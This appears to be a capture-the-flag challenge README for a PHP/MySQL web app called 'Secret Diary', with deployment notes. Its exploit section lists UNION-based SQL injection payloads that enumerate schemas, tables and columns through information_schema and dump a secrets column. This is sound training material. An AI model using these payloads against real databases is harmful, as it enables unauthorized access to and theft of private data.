# Name: Secret Diary

## Description

I created a website where everyone can store their secrets.
I have some confidential data here, but I am sure you can't see it.

Get the flag from http://141.85.224.118:12000/.

Score: 100

## Vulnerability

Here we have a sql injection problem, the vulnerable box is `Get your secrets!`.

## Exploit

First time you need to find out the number of columns in the table
from which the selection is made.

We have 2 columns.

- `' UNION SELECT 1, 2 FROM information_schema.schemata -- comment`

Find all schemas.

- `' UNION SELECT 1, GROUP_CONCAT(0x7c, schema_name, 0x7c) FROM information_schema.schemata -- comment`

Find all tables from `top_secret` schema.

- `' UNION SELECT 1, GROUP_CONCAT(0x7c, table_name, 0x7c) FROM information_schema.tables WHERE table_schema='top_secret' -- comment`

Find all columns in table `secrets`.

- `' UNION SELECT 1, GROUP_CONCAT(0x7c, column_name, 0x7c) FROM information_schema.columns WHERE table_name='secrets' -- comment`

Find all values in `secret` column.

- `' UNION SELECT 1, GROUP_CONCAT(0x7c, secret, 0x7c) FROM secrets -- comment`

## Environment

Web server with PHP and MYSQL support (deployable as a Docker container using files in `deploy/` folder)

## Deploy

Copy `deploy/` folder and run `make run`.

If you need to update the image and container, remove the old container with `make clean` and update the image (and container) using `make`.

It is not possible to update the container without updating the image first.
